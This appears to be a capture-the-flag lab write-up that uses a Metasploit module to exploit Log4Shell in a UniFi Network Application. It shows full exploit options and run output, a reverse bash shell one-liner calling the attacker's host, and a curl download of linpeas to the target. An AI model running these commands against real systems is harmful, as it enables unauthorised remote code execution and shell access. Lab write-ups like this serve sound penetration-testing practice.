Metasploit points to some possible log4j exploits 

##Metasploit module
```
msf6 > search fullname:UniFi

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank       Check  Description
   -  ----                                                   ---------------  ----       -----  -----------
   0  exploit/multi/misc/jboss_remoting_unified_invoker_rce  2019-12-11       excellent  Yes    JBOSS EAP/AS Remoting Unified Invoker RCE
   1    \_ target: Unix Command                              .                .          .      .
   2    \_ target: Linux Dropper                             .                .          .      .
   3  post/multi/gather/ubiquiti_unifi_backup                .                normal     No     Multi Gather Ubiquiti UniFi Controller Backup
   4  exploit/multi/http/ubiquiti_unifi_log4shell            2021-12-09       excellent  Yes    UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)
   5    \_ target: Windows                                   .                .          .      .
   6    \_ target: Unix                                      .                .          .      .
   7    \_ AKA: Log4Shell                                    .                .          .      .
   8    \_ AKA: LogJam                                       .                .          .      .
   9  exploit/windows/misc/unified_remote_rce                2021-02-25       normal     Yes    Unified Remote Auth Bypass to RCE
   
msf6 > info 6

       Name: UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)
     Module: exploit/multi/http/ubiquiti_unifi_log4shell
   Platform: 
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-12-09

Provided by:
  Spencer McIntyre
  RageLtMan <rageltman@sempervictus>
  Nicholas Anastasi

Module side effects:
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
      0   Windows
  =>  1   Unix

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  LDIF_FILE                   no        Directory LDIF file path
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, ht
                                        tp
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      8443             yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
                                         on all addresses.
  SRVPORT    389              yes       The local port to listen on.
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       Base path
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell
  vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the
  /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java
  object. This results in OS command execution in the context of the server application.

  This module will start an LDAP server that the target will need to connect to.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
  https://github.com/puzzlepeaches/Log4jUnifi
  https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1

Also known as:
  Log4Shell
  LogJam


View the full module info with the info -d command.

```

## Setting parameters and running
```
msf6 exploit(multi/http/ubiquiti_unifi_log4shell) > options

Module options (exploit/multi/http/ubiquiti_unifi_log4shell):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   LDIF_FILE                   no        Directory LDIF file path
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, h
                                         ttp
   RHOSTS     10.129.228.29    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8443             yes       The target port (TCP)
   SRVHOST    10.10.16.23      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to liste
                                         n on all addresses.
   SRVPORT    389              yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.23      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Unix



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/ubiquiti_unifi_log4shell) > run
[*] Started reverse TCP handler on 10.10.16.23:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[+] Delivering the serialized Java object to execute the payload...
[*] Command shell session 1 opened (10.10.16.23:4444 -> 10.129.228.29:57476) at 2025-08-23 14:15:33 -0600
[*] Server stopped.

```
## Executing commands
Despite the saying 'Sever Stopped', commands can be executed
```
[*] Server stopped.

^[

sh: 3:  not found
ls
bin
data
dl
lib
logs
run
webapps
work
id
uid=999(unifi) gid=999(unifi) groups=999(unifi)

```
## Poking around
Found user flag, see [[Unified/10 - Loot/10 - Loot|10 - Loot]]

## Upgrading the shell
```
shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[-] python3 not found
[*] Trying to find binary 'script' on the target machine
[*] Found script at /usr/bin/script
[*] Using `script` to pop up an interactive shell

$ /bin/bash -i
/bin/bash -i
unifi@unified:/home$

### Attacker - listen on 1337

### Target
unifi@unified:/home$ bash -i >& /dev/tcp/10.10.16.23/1337 0>&1
bash -i >& /dev/tcp/10.10.16.23/1337 0>&1

## Ahh, there is no python on the box
unifi@unified:/home$ which python python2 python3
which python python2 python3
```

## Uploading linpeas
```
### Attacker
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


### Target
unifi@unified:/tmp/ignore$ which curl
which curl
/usr/bin/curl
unifi@unified:/tmp/ignore$ curl http://10.10.16.23:8000/linpeas.sh -o linpeas.sh
<SNIP>
  932k  100  932k    0     0   113k      0  0:00:08  0:00:08 --:--:--  132k
unifi@unified:/tmp/ignore$ ls
ls
linpeas.sh

```